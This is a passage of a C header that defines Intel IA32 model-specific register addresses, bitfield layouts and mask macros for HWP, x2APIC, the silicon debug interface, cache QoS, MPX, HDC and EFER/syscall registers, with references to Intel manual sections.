         * @see Vol3B[14.4.4(Managing HWP)]
         */
        UINT64 ActivityWindow : 10;
#define IA32_HWP_REQUEST_PKG_ACTIVITY_WINDOW_BIT                     32
#define IA32_HWP_REQUEST_PKG_ACTIVITY_WINDOW_FLAG                    0x3FF00000000
#define IA32_HWP_REQUEST_PKG_ACTIVITY_WINDOW_MASK                    0x3FF
#define IA32_HWP_REQUEST_PKG_ACTIVITY_WINDOW(_)                      (((_) >> 32) & 0x3FF)
        UINT64 Reserved1 : 22;
    };

    UINT64 Flags;
} IA32_HWP_REQUEST_PKG_REGISTER;


/**
 * Control HWP Native Interrupts.
 *
 * @remarks If CPUID.06H:EAX.[8] = 1
 */
#define IA32_HWP_INTERRUPT                                           0x00000773
typedef union
{
    struct
    {
        /**
         * [Bit 0] EN_Guaranteed_Performance_Change.
         *
         * @remarks If CPUID.06H:EAX.[8] = 1
         * @see Vol3B[14.4.6(HWP Notifications)]
         */
        UINT64 EnGuaranteedPerformanceChange : 1;
#define IA32_HWP_INTERRUPT_EN_GUARANTEED_PERFORMANCE_CHANGE_BIT      0
#define IA32_HWP_INTERRUPT_EN_GUARANTEED_PERFORMANCE_CHANGE_FLAG     0x01
#define IA32_HWP_INTERRUPT_EN_GUARANTEED_PERFORMANCE_CHANGE_MASK     0x01
#define IA32_HWP_INTERRUPT_EN_GUARANTEED_PERFORMANCE_CHANGE(_)       (((_) >> 0) & 0x01)

        /**
         * [Bit 1] EN_Excursion_Minimum.
         *
         * @remarks If CPUID.06H:EAX.[8] = 1
         * @see Vol3B[14.4.6(HWP Notifications)]
         */
        UINT64 EnExcursionMinimum : 1;
#define IA32_HWP_INTERRUPT_EN_EXCURSION_MINIMUM_BIT                  1
#define IA32_HWP_INTERRUPT_EN_EXCURSION_MINIMUM_FLAG                 0x02
#define IA32_HWP_INTERRUPT_EN_EXCURSION_MINIMUM_MASK                 0x01
#define IA32_HWP_INTERRUPT_EN_EXCURSION_MINIMUM(_)                   (((_) >> 1) & 0x01)
        UINT64 Reserved1 : 62;
    };

    UINT64 Flags;
} IA32_HWP_INTERRUPT_REGISTER;


/**
 * Power Management Control Hints to a Logical Processor.
 *
 * @remarks If CPUID.06H:EAX.[7] = 1
 */
#define IA32_HWP_REQUEST                                             0x00000774
typedef union
{
    struct
    {
        /**
         * [Bits 7:0] Minimum_Performance.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1
         * @see Vol3B[14.4.4(Managing HWP)]
         */
        UINT64 MinimumPerformance : 8;
#define IA32_HWP_REQUEST_MINIMUM_PERFORMANCE_BIT                     0
#define IA32_HWP_REQUEST_MINIMUM_PERFORMANCE_FLAG                    0xFF
#define IA32_HWP_REQUEST_MINIMUM_PERFORMANCE_MASK                    0xFF
#define IA32_HWP_REQUEST_MINIMUM_PERFORMANCE(_)                      (((_) >> 0) & 0xFF)

        /**
         * [Bits 15:8] Maximum_Performance.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1
         * @see Vol3B[14.4.4(Managing HWP)]
         */
        UINT64 MaximumPerformance : 8;
#define IA32_HWP_REQUEST_MAXIMUM_PERFORMANCE_BIT                     8
#define IA32_HWP_REQUEST_MAXIMUM_PERFORMANCE_FLAG                    0xFF00
#define IA32_HWP_REQUEST_MAXIMUM_PERFORMANCE_MASK                    0xFF
#define IA32_HWP_REQUEST_MAXIMUM_PERFORMANCE(_)                      (((_) >> 8) & 0xFF)

        /**
         * [Bits 23:16] Desired_Performance.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1
         * @see Vol3B[14.4.4(Managing HWP)]
         */
        UINT64 DesiredPerformance : 8;
#define IA32_HWP_REQUEST_DESIRED_PERFORMANCE_BIT                     16
#define IA32_HWP_REQUEST_DESIRED_PERFORMANCE_FLAG                    0xFF0000
#define IA32_HWP_REQUEST_DESIRED_PERFORMANCE_MASK                    0xFF
#define IA32_HWP_REQUEST_DESIRED_PERFORMANCE(_)                      (((_) >> 16) & 0xFF)

        /**
         * [Bits 31:24] Energy_Performance_Preference.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1 && CPUID.06H:EAX.[10] = 1
         * @see Vol3B[14.4.4(Managing HWP)]
         */
        UINT64 EnergyPerformancePreference : 8;
#define IA32_HWP_REQUEST_ENERGY_PERFORMANCE_PREFERENCE_BIT           24
#define IA32_HWP_REQUEST_ENERGY_PERFORMANCE_PREFERENCE_FLAG          0xFF000000
#define IA32_HWP_REQUEST_ENERGY_PERFORMANCE_PREFERENCE_MASK          0xFF
#define IA32_HWP_REQUEST_ENERGY_PERFORMANCE_PREFERENCE(_)            (((_) >> 24) & 0xFF)

        /**
         * [Bits 41:32] Activity_Window.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1 && CPUID.06H:EAX.[9] = 1
         * @see Vol3B[14.4.4(Managing HWP)]
         */
        UINT64 ActivityWindow : 10;
#define IA32_HWP_REQUEST_ACTIVITY_WINDOW_BIT                         32
#define IA32_HWP_REQUEST_ACTIVITY_WINDOW_FLAG                        0x3FF00000000
#define IA32_HWP_REQUEST_ACTIVITY_WINDOW_MASK                        0x3FF
#define IA32_HWP_REQUEST_ACTIVITY_WINDOW(_)                          (((_) >> 32) & 0x3FF)

        /**
         * [Bit 42] Package_Control.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1 && CPUID.06H:EAX.[11] = 1
         * @see Vol3B[14.4.4(Managing HWP)]
         */
        UINT64 PackageControl : 1;
#define IA32_HWP_REQUEST_PACKAGE_CONTROL_BIT                         42
#define IA32_HWP_REQUEST_PACKAGE_CONTROL_FLAG                        0x40000000000
#define IA32_HWP_REQUEST_PACKAGE_CONTROL_MASK                        0x01
#define IA32_HWP_REQUEST_PACKAGE_CONTROL(_)                          (((_) >> 42) & 0x01)
        UINT64 Reserved1 : 21;
    };

    UINT64 Flags;
} IA32_HWP_REQUEST_REGISTER;


/**
 * Log bits indicating changes to Guaranteed & excursions to Minimum.
 *
 * @remarks If CPUID.06H:EAX.[7] = 1
 */
#define IA32_HWP_STATUS                                              0x00000777
typedef union
{
    struct
    {
        /**
         * [Bit 0] Guaranteed_Performance_Change.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1
         * @see Vol3B[14.4.5(HWP Feedback)]
         */
        UINT64 GuaranteedPerformanceChange : 1;
#define IA32_HWP_STATUS_GUARANTEED_PERFORMANCE_CHANGE_BIT            0
#define IA32_HWP_STATUS_GUARANTEED_PERFORMANCE_CHANGE_FLAG           0x01
#define IA32_HWP_STATUS_GUARANTEED_PERFORMANCE_CHANGE_MASK           0x01
#define IA32_HWP_STATUS_GUARANTEED_PERFORMANCE_CHANGE(_)             (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 1;

        /**
         * [Bit 2] Excursion_To_Minimum.
         *
         * @remarks If CPUID.06H:EAX.[7] = 1
         * @see Vol3B[14.4.5(HWP Feedback)]
         */
        UINT64 ExcursionToMinimum : 1;
#define IA32_HWP_STATUS_EXCURSION_TO_MINIMUM_BIT                     2
#define IA32_HWP_STATUS_EXCURSION_TO_MINIMUM_FLAG                    0x04
#define IA32_HWP_STATUS_EXCURSION_TO_MINIMUM_MASK                    0x01
#define IA32_HWP_STATUS_EXCURSION_TO_MINIMUM(_)                      (((_) >> 2) & 0x01)
        UINT64 Reserved2 : 61;
    };

    UINT64 Flags;
} IA32_HWP_STATUS_REGISTER;


/**
 * x2APIC ID Register.
 *
 * @remarks If CPUID.01H:ECX[21] = 1 && IA32_APIC_BASE.[10] = 1
 * @see Vol3A[10.12(EXTENDED XAPIC (X2APIC))]
 */
#define IA32_X2APIC_APICID                                           0x00000802

 /**
  * x2APIC Version Register.
  *
  * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
  */
#define IA32_X2APIC_VERSION                                          0x00000803

  /**
   * x2APIC Task Priority Register.
   *
   * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
   */
#define IA32_X2APIC_TPR                                              0x00000808

   /**
    * x2APIC Processor Priority Register.
    *
    * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
    */
#define IA32_X2APIC_PPR                                              0x0000080A

    /**
     * x2APIC EOI Register.
     *
     * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
     */
#define IA32_X2APIC_EOI                                              0x0000080B

     /**
      * x2APIC Logical Destination Register.
      *
      * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
      */
#define IA32_X2APIC_LDR                                              0x0000080D

      /**
       * x2APIC Spurious Interrupt Vector Register.
       *
       * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
       */
#define IA32_X2APIC_SIVR                                             0x0000080F
       /**
        * @defgroup IA32_X2APIC_ISR \
        *           IA32_X2APIC_ISR(n)
        *
        * x2APIC In-Service Register Bits (n * 32 + 31):(n * 32).
        *
        * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
        * @{
        */
#define IA32_X2APIC_ISR0                                             0x00000810
#define IA32_X2APIC_ISR1                                             0x00000811
#define IA32_X2APIC_ISR2                                             0x00000812
#define IA32_X2APIC_ISR3                                             0x00000813
#define IA32_X2APIC_ISR4                                             0x00000814
#define IA32_X2APIC_ISR5                                             0x00000815
#define IA32_X2APIC_ISR6                                             0x00000816
#define IA32_X2APIC_ISR7                                             0x00000817
        /**
         * @}
         */

         /**
          * @defgroup IA32_X2APIC_TMR \
          *           IA32_X2APIC_TMR(n)
          *
          * x2APIC Trigger Mode Register Bits (n * 32 + 31):(n * 32).
          *
          * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
          * @{
          */
#define IA32_X2APIC_TMR0                                             0x00000818
#define IA32_X2APIC_TMR1                                             0x00000819
#define IA32_X2APIC_TMR2                                             0x0000081A
#define IA32_X2APIC_TMR3                                             0x0000081B
#define IA32_X2APIC_TMR4                                             0x0000081C
#define IA32_X2APIC_TMR5                                             0x0000081D
#define IA32_X2APIC_TMR6                                             0x0000081E
#define IA32_X2APIC_TMR7                                             0x0000081F
          /**
           * @}
           */

           /**
            * @defgroup IA32_X2APIC_IRR \
            *           IA32_X2APIC_IRR(n)
            *
            * x2APIC Interrupt Request Register Bits (n * 32 + 31):(n * 32).
            *
            * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
            * @{
            */
#define IA32_X2APIC_IRR0                                             0x00000820
#define IA32_X2APIC_IRR1                                             0x00000821
#define IA32_X2APIC_IRR2                                             0x00000822
#define IA32_X2APIC_IRR3                                             0x00000823
#define IA32_X2APIC_IRR4                                             0x00000824
#define IA32_X2APIC_IRR5                                             0x00000825
#define IA32_X2APIC_IRR6                                             0x00000826
#define IA32_X2APIC_IRR7                                             0x00000827
            /**
             * @}
             */


             /**
              * x2APIC Error Status Register.
              *
              * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
              */
#define IA32_X2APIC_ESR                                              0x00000828

              /**
               * x2APIC LVT Corrected Machine Check Interrupt Register.
               *
               * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
               */
#define IA32_X2APIC_LVT_CMCI                                         0x0000082F

               /**
                * x2APIC Interrupt Command Register.
                *
                * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
                */
#define IA32_X2APIC_ICR                                              0x00000830

                /**
                 * x2APIC LVT Timer Interrupt Register.
                 *
                 * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
                 */
#define IA32_X2APIC_LVT_TIMER                                        0x00000832

                 /**
                  * x2APIC LVT Thermal Sensor Interrupt Register.
                  *
                  * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
                  */
#define IA32_X2APIC_LVT_THERMAL                                      0x00000833

                  /**
                   * x2APIC LVT Performance Monitor Interrupt Register.
                   *
                   * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
                   */
#define IA32_X2APIC_LVT_PMI                                          0x00000834

                   /**
                    * x2APIC LVT LINT0 Register.
                    *
                    * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
                    */
#define IA32_X2APIC_LVT_LINT0                                        0x00000835

                    /**
                     * x2APIC LVT LINT1 Register.
                     *
                     * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
                     */
#define IA32_X2APIC_LVT_LINT1                                        0x00000836

                     /**
                      * x2APIC LVT Error Register.
                      *
                      * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
                      */
#define IA32_X2APIC_LVT_ERROR                                        0x00000837

                      /**
                       * x2APIC Initial Count Register.
                       *
                       * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
                       */
#define IA32_X2APIC_INIT_COUNT                                       0x00000838

                       /**
                        * x2APIC Current Count Register.
                        *
                        * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
                        */
#define IA32_X2APIC_CUR_COUNT                                        0x00000839

                        /**
                         * x2APIC Divide Configuration Register.
                         *
                         * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
                         */
#define IA32_X2APIC_DIV_CONF                                         0x0000083E

                         /**
                          * x2APIC Self IPI Register.
                          *
                          * @remarks If CPUID.01H:ECX.[21] = 1 && IA32_APIC_BASE.[10] = 1
                          */
#define IA32_X2APIC_SELF_IPI                                         0x0000083F

                          /**
                           * Silicon Debug Feature Control.
                           *
                           * @remarks If CPUID.01H:ECX.[11] = 1
                           */
#define IA32_DEBUG_INTERFACE                                         0x00000C80
typedef union
{
    struct
    {
        /**
         * @brief Enable <b>(R/W)</b>
         *
         * [Bit 0] BIOS set 1 to enable Silicon debug features. Default is 0.
         *
         * @remarks If CPUID.01H:ECX.[11] = 1
         */
        UINT64 Enable : 1;
#define IA32_DEBUG_INTERFACE_ENABLE_BIT                              0
#define IA32_DEBUG_INTERFACE_ENABLE_FLAG                             0x01
#define IA32_DEBUG_INTERFACE_ENABLE_MASK                             0x01
#define IA32_DEBUG_INTERFACE_ENABLE(_)                               (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 29;

        /**
         * @brief Lock <b>(R/W)</b>
         *
         * [Bit 30] If 1, locks any further change to the MSR. The lock bit is set automatically on the first SMI assertion even if
         * not explicitly set by BIOS. Default is 0.
         *
         * @remarks If CPUID.01H:ECX.[11] = 1
         */
        UINT64 Lock : 1;
#define IA32_DEBUG_INTERFACE_LOCK_BIT                                30
#define IA32_DEBUG_INTERFACE_LOCK_FLAG                               0x40000000
#define IA32_DEBUG_INTERFACE_LOCK_MASK                               0x01
#define IA32_DEBUG_INTERFACE_LOCK(_)                                 (((_) >> 30) & 0x01)

        /**
         * @brief Debug Occurred <b>(R/O)</b>
         *
         * [Bit 31] This "sticky bit" is set by hardware to indicate the status of bit 0. Default is 0.
         *
         * @remarks If CPUID.01H:ECX.[11] = 1
         */
        UINT64 DebugOccurred : 1;
#define IA32_DEBUG_INTERFACE_DEBUG_OCCURRED_BIT                      31
#define IA32_DEBUG_INTERFACE_DEBUG_OCCURRED_FLAG                     0x80000000
#define IA32_DEBUG_INTERFACE_DEBUG_OCCURRED_MASK                     0x01
#define IA32_DEBUG_INTERFACE_DEBUG_OCCURRED(_)                       (((_) >> 31) & 0x01)
        UINT64 Reserved2 : 32;
    };

    UINT64 Flags;
} IA32_DEBUG_INTERFACE_REGISTER;


/**
 * L3 QOS Configuration.
 *
 * @remarks If ( CPUID.(EAX=10H, ECX=1):ECX.[2] = 1 )
 */
#define IA32_L3_QOS_CFG                                              0x00000C81
typedef union
{
    struct
    {
        /**
         * @brief Enable <b>(R/W)</b>
         *
         * [Bit 0] Set 1 to enable L3 CAT masks and COS to operate in Code and Data Prioritization (CDP) mode.
         */
        UINT64 Enable : 1;
#define IA32_L3_QOS_CFG_ENABLE_BIT                                   0
#define IA32_L3_QOS_CFG_ENABLE_FLAG                                  0x01
#define IA32_L3_QOS_CFG_ENABLE_MASK                                  0x01
#define IA32_L3_QOS_CFG_ENABLE(_)                                    (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 63;
    };

    UINT64 Flags;
} IA32_L3_QOS_CFG_REGISTER;


/**
 * L2 QOS Configuration.
 *
 * @remarks If ( CPUID.(EAX=10H, ECX=2):ECX.[2] = 1 )
 */
#define IA32_L2_QOS_CFG                                              0x00000C82
typedef union
{
    struct
    {
        /**
         * @brief Enable <b>(R/W)</b>
         *
         * [Bit 0] Set 1 to enable L2 CAT masks and COS to operate in Code and Data Prioritization (CDP) mode.
         */
        UINT64 Enable : 1;
#define IA32_L2_QOS_CFG_ENABLE_BIT                                   0
#define IA32_L2_QOS_CFG_ENABLE_FLAG                                  0x01
#define IA32_L2_QOS_CFG_ENABLE_MASK                                  0x01
#define IA32_L2_QOS_CFG_ENABLE(_)                                    (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 63;
    };

    UINT64 Flags;
} IA32_L2_QOS_CFG_REGISTER;


/**
 * Monitoring Event Select Register.
 *
 * @remarks If ( CPUID.(EAX=07H, ECX=0):EBX.[12] = 1 )
 */
#define IA32_QM_EVTSEL                                               0x00000C8D
typedef union
{
    struct
    {
        /**
         * @brief Event ID
         *
         * [Bits 7:0] ID of a supported monitoring event to report via IA32_QM_CTR.
         */
        UINT64 EventId : 8;
#define IA32_QM_EVTSEL_EVENT_ID_BIT                                  0
#define IA32_QM_EVTSEL_EVENT_ID_FLAG                                 0xFF
#define IA32_QM_EVTSEL_EVENT_ID_MASK                                 0xFF
#define IA32_QM_EVTSEL_EVENT_ID(_)                                   (((_) >> 0) & 0xFF)
        UINT64 Reserved1 : 24;

        /**
         * @brief Resource Monitoring ID
         *
         * [Bits 63:32] ID for monitoring hardware to report monitored data via IA32_QM_CTR.
         *
         * @remarks Bits [N+31:32] N = Ceil (Log2 (CPUID.(EAX= 0FH,ECX=0H).EBX[31:0] + 1))
         */
        UINT64 ResourceMonitoringId : 32;
#define IA32_QM_EVTSEL_RESOURCE_MONITORING_ID_BIT                    32
#define IA32_QM_EVTSEL_RESOURCE_MONITORING_ID_FLAG                   0xFFFFFFFF00000000
#define IA32_QM_EVTSEL_RESOURCE_MONITORING_ID_MASK                   0xFFFFFFFF
#define IA32_QM_EVTSEL_RESOURCE_MONITORING_ID(_)                     (((_) >> 32) & 0xFFFFFFFF)
    };

    UINT64 Flags;
} IA32_QM_EVTSEL_REGISTER;


/**
 * Monitoring Counter Register.
 *
 * @remarks If ( CPUID.(EAX=07H, ECX=0):EBX.[12] = 1 )
 */
#define IA32_QM_CTR                                                  0x00000C8E
typedef union
{
    struct
    {
        /**
         * [Bits 61:0] Resource Monitored Data.
         */
        UINT64 ResourceMonitoredData : 62;
#define IA32_QM_CTR_RESOURCE_MONITORED_DATA_BIT                      0
#define IA32_QM_CTR_RESOURCE_MONITORED_DATA_FLAG                     0x3FFFFFFFFFFFFFFF
#define IA32_QM_CTR_RESOURCE_MONITORED_DATA_MASK                     0x3FFFFFFFFFFFFFFF
#define IA32_QM_CTR_RESOURCE_MONITORED_DATA(_)                       (((_) >> 0) & 0x3FFFFFFFFFFFFFFF)

        /**
         * @brief Unavailable
         *
         * [Bit 62] If 1, indicates data for this RMID is not available or not monitored for this resource or RMID.
         */
        UINT64 Unavailable : 1;
#define IA32_QM_CTR_UNAVAILABLE_BIT                                  62
#define IA32_QM_CTR_UNAVAILABLE_FLAG                                 0x4000000000000000
#define IA32_QM_CTR_UNAVAILABLE_MASK                                 0x01
#define IA32_QM_CTR_UNAVAILABLE(_)                                   (((_) >> 62) & 0x01)

        /**
         * @brief Error
         *
         * [Bit 63] If 1, indicates an unsupported RMID or event type was written to IA32_PQR_QM_EVTSEL.
         */
        UINT64 Error : 1;
#define IA32_QM_CTR_ERROR_BIT                                        63
#define IA32_QM_CTR_ERROR_FLAG                                       0x8000000000000000
#define IA32_QM_CTR_ERROR_MASK                                       0x01
#define IA32_QM_CTR_ERROR(_)                                         (((_) >> 63) & 0x01)
    };

    UINT64 Flags;
} IA32_QM_CTR_REGISTER;


/**
 * Resource Association Register.
 *
 * @remarks If ( (CPUID.(EAX=07H, ECX=0):EBX[12] = 1) or (CPUID.(EAX=07H, ECX=0):EBX[15] = 1 ) )
 */
#define IA32_PQR_ASSOC                                               0x00000C8F
typedef union
{
    struct
    {
        /**
         * @brief Resource Monitoring ID <b>(R/W)</b>
         *
         * [Bits 31:0] ID for monitoring hardware to track internal operation, e.g., memory access.
         *
         * @remarks Bits [N-1:0] N = Ceil (Log2 (CPUID.(EAX= 0FH, ECX=0H).EBX[31:0] +1)) 31:N Reserved
         */
        UINT64 ResourceMonitoringId : 32;
#define IA32_PQR_ASSOC_RESOURCE_MONITORING_ID_BIT                    0
#define IA32_PQR_ASSOC_RESOURCE_MONITORING_ID_FLAG                   0xFFFFFFFF
#define IA32_PQR_ASSOC_RESOURCE_MONITORING_ID_MASK                   0xFFFFFFFF
#define IA32_PQR_ASSOC_RESOURCE_MONITORING_ID(_)                     (((_) >> 0) & 0xFFFFFFFF)

        /**
         * @brief COS <b>(R/W)</b>
         *
         * [Bits 63:32] The class of service (COS) to enforce (on writes); returns the current COS when read.
         *
         * @remarks If ( CPUID.(EAX=07H, ECX=0):EBX.[15] = 1 )
         */
        UINT64 Cos : 32;
#define IA32_PQR_ASSOC_COS_BIT                                       32
#define IA32_PQR_ASSOC_COS_FLAG                                      0xFFFFFFFF00000000
#define IA32_PQR_ASSOC_COS_MASK                                      0xFFFFFFFF
#define IA32_PQR_ASSOC_COS(_)                                        (((_) >> 32) & 0xFFFFFFFF)
    };

    UINT64 Flags;
} IA32_PQR_ASSOC_REGISTER;


/**
 * Supervisor State of MPX Configuration.
 *
 * @remarks If (CPUID.(EAX=07H, ECX=0H):EBX[14] = 1)
 */
#define IA32_BNDCFGS                                                 0x00000D90
typedef union
{
    struct
    {
        /**
         * [Bit 0] Enable Intel MPX in supervisor mode.
         */
        UINT64 Enable : 1;
#define IA32_BNDCFGS_ENABLE_BIT                                      0
#define IA32_BNDCFGS_ENABLE_FLAG                                     0x01
#define IA32_BNDCFGS_ENABLE_MASK                                     0x01
#define IA32_BNDCFGS_ENABLE(_)                                       (((_) >> 0) & 0x01)

        /**
         * [Bit 1] Preserve the bounds registers for near branch instructions in the absence of the BND prefix.
         */
        UINT64 BndPreserve : 1;
#define IA32_BNDCFGS_BND_PRESERVE_BIT                                1
#define IA32_BNDCFGS_BND_PRESERVE_FLAG                               0x02
#define IA32_BNDCFGS_BND_PRESERVE_MASK                               0x01
#define IA32_BNDCFGS_BND_PRESERVE(_)                                 (((_) >> 1) & 0x01)
        UINT64 Reserved1 : 10;

        /**
         * [Bits 63:12] Base Address of Bound Directory.
         */
        UINT64 BoundDirectoryBaseAddress : 52;
#define IA32_BNDCFGS_BOUND_DIRECTORY_BASE_ADDRESS_BIT                12
#define IA32_BNDCFGS_BOUND_DIRECTORY_BASE_ADDRESS_FLAG               0xFFFFFFFFFFFFF000
#define IA32_BNDCFGS_BOUND_DIRECTORY_BASE_ADDRESS_MASK               0xFFFFFFFFFFFFF
#define IA32_BNDCFGS_BOUND_DIRECTORY_BASE_ADDRESS(_)                 (((_) >> 12) & 0xFFFFFFFFFFFFF)
    };

    UINT64 Flags;
} IA32_BNDCFGS_REGISTER;


/**
 * Extended Supervisor State Mask.
 *
 * @remarks If ( CPUID.(0DH, 1):EAX.[3] = 1
 */
#define IA32_XSS                                                     0x00000DA0
typedef union
{
    struct
    {
        UINT64 Reserved1 : 8;

        /**
         * [Bit 8] Trace Packet Configuration State.
         */
        UINT64 TracePacketConfigurationState : 1;
#define IA32_XSS_TRACE_PACKET_CONFIGURATION_STATE_BIT                8
#define IA32_XSS_TRACE_PACKET_CONFIGURATION_STATE_FLAG               0x100
#define IA32_XSS_TRACE_PACKET_CONFIGURATION_STATE_MASK               0x01
#define IA32_XSS_TRACE_PACKET_CONFIGURATION_STATE(_)                 (((_) >> 8) & 0x01)
        UINT64 Reserved2 : 55;
    };

    UINT64 Flags;
} IA32_XSS_REGISTER;


/**
 * Package Level Enable/disable HDC.
 *
 * @remarks If CPUID.06H:EAX.[13] = 1
 */
#define IA32_PKG_HDC_CTL                                             0x00000DB0
typedef union
{
    struct
    {
        /**
         * @brief HDC_Pkg_Enable <b>(R/W)</b>
         *
         * [Bit 0] Force HDC idling or wake up HDC-idled logical processors in the package.
         *
         * @remarks If CPUID.06H:EAX.[13] = 1
         * @see Vol3B[14.5.2(Package level Enabling HDC)]
         */
        UINT64 HdcPkgEnable : 1;
#define IA32_PKG_HDC_CTL_HDC_PKG_ENABLE_BIT                          0
#define IA32_PKG_HDC_CTL_HDC_PKG_ENABLE_FLAG                         0x01
#define IA32_PKG_HDC_CTL_HDC_PKG_ENABLE_MASK                         0x01
#define IA32_PKG_HDC_CTL_HDC_PKG_ENABLE(_)                           (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 63;
    };

    UINT64 Flags;
} IA32_PKG_HDC_CTL_REGISTER;


/**
 * Enable/disable HWP.
 *
 * @remarks If CPUID.06H:EAX.[13] = 1
 */
#define IA32_PM_CTL1                                                 0x00000DB1
typedef union
{
    struct
    {
        /**
         * @brief HDC_Allow_Block <b>(R/W)</b>
         *
         * [Bit 0] Allow/Block this logical processor for package level HDC control.
         *
         * @remarks If CPUID.06H:EAX.[13] = 1
         * @see Vol3B[14.5.3(Logical-Processor Level HDC Control)]
         */
        UINT64 HdcAllowBlock : 1;
#define IA32_PM_CTL1_HDC_ALLOW_BLOCK_BIT                             0
#define IA32_PM_CTL1_HDC_ALLOW_BLOCK_FLAG                            0x01
#define IA32_PM_CTL1_HDC_ALLOW_BLOCK_MASK                            0x01
#define IA32_PM_CTL1_HDC_ALLOW_BLOCK(_)                              (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 63;
    };

    UINT64 Flags;
} IA32_PM_CTL1_REGISTER;


/**
 * Per-Logical_Processor HDC Idle Residency.
 *
 * @remarks If CPUID.06H:EAX.[13] = 1
 */
#define IA32_THREAD_STALL                                            0x00000DB2
typedef struct
{
    /**
     * @brief Stall_Cycle_Cnt <b>(R/W)</b>
     *
     * Stalled cycles due to HDC forced idle on this logical processor.
     *
     * @remarks If CPUID.06H:EAX.[13] = 1
     * @see Vol3B[14.5.4.1(IA32_THREAD_STALL)]
     */
    UINT64 StallCycleCount;
} IA32_THREAD_STALL_REGISTER;


/**
 * Extended Feature Enables.
 *
 * @remarks If CPUID.06H:EAX.[13] = 1
 */
#define IA32_EFER                                                    0xC0000080
typedef union
{
    struct
    {
        /**
         * @brief SYSCALL Enable <b>(R/W)</b>
         *
         * [Bit 0] Enables SYSCALL/SYSRET instructions in 64-bit mode.
         */
        UINT64 SyscallEnable : 1;
#define IA32_EFER_SYSCALL_ENABLE_BIT                                 0
#define IA32_EFER_SYSCALL_ENABLE_FLAG                                0x01
#define IA32_EFER_SYSCALL_ENABLE_MASK                                0x01
#define IA32_EFER_SYSCALL_ENABLE(_)                                  (((_) >> 0) & 0x01)
        UINT64 Reserved1 : 7;

        /**
         * @brief IA-32e Mode Enable <b>(R/W)</b>
         *
         * [Bit 8] Enables IA-32e mode operation.
         */
        UINT64 Ia32EModeEnable : 1;
#define IA32_EFER_IA32E_MODE_ENABLE_BIT                              8
#define IA32_EFER_IA32E_MODE_ENABLE_FLAG                             0x100
#define IA32_EFER_IA32E_MODE_ENABLE_MASK                             0x01
#define IA32_EFER_IA32E_MODE_ENABLE(_)                               (((_) >> 8) & 0x01)
        UINT64 Reserved2 : 1;

        /**
         * @brief IA-32e Mode Active <b>(R)</b>
         *
         * [Bit 10] Indicates IA-32e mode is active when set.
         */
        UINT64 Ia32EModeActive : 1;
#define IA32_EFER_IA32E_MODE_ACTIVE_BIT                              10
#define IA32_EFER_IA32E_MODE_ACTIVE_FLAG                             0x400
#define IA32_EFER_IA32E_MODE_ACTIVE_MASK                             0x01
#define IA32_EFER_IA32E_MODE_ACTIVE(_)                               (((_) >> 10) & 0x01)

        /**
         * [Bit 11] Execute Disable Bit Enable.
         */
        UINT64 ExecuteDisableBitEnable : 1;
#define IA32_EFER_EXECUTE_DISABLE_BIT_ENABLE_BIT                     11
#define IA32_EFER_EXECUTE_DISABLE_BIT_ENABLE_FLAG                    0x800
#define IA32_EFER_EXECUTE_DISABLE_BIT_ENABLE_MASK                    0x01
#define IA32_EFER_EXECUTE_DISABLE_BIT_ENABLE(_)                      (((_) >> 11) & 0x01)
        UINT64 Reserved3 : 52;
    };

    UINT64 Flags;
} IA32_EFER_REGISTER;


/**
 * System Call Target Address.
 *
 * @remarks If CPUID.80000001:EDX.[29] = 1
 */
#define IA32_STAR                                                    0xC0000081

 /**
  * @brief IA-32e Mode System Call Target Address <b>(R/W)</b>
  *
  * Target RIP for the called procedure when SYSCALL is executed in 64-bit mode.
  *
  * @remarks If CPUID.80000001:EDX.[29] = 1
  */
#define IA32_LSTAR                                                   0xC0000082

  /**
   * @brief IA-32e Mode System Call Target Address <b>(R/W)</b>
   *
   * Not used, as the SYSCALL instruction is not recognized in compatibility mode.
   *
   * @remarks If CPUID.80000001:EDX.[29] = 1
   */
#define IA32_CSTAR                                                   0xC0000083

   /**
    * System Call Flag Mask.
    *
    * @remarks If CPUID.80000001:EDX.[29] = 1
    */
#define IA32_FMASK                                                   0xC0000084

    /**
     * Map of BASE Address of FS.
     *
     * @remarks If CPUID.80000001:EDX.[29] = 1
     */
#define IA32_FS_BASE                                                 0xC0000100

     /**
